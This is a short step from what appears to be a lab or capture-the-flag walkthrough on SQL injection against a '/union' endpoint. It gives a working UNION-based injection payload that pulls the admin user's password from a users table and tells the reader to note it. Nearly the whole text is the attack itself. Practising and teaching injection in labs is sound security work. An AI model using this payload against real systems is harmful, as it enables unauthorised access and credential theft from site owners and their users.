🧪 Step 1: SQLi Exfil in /union

Submit:

' UNION SELECT 1, password FROM users WHERE username='admin'--

✔️ This dumps the admin’s password — note it.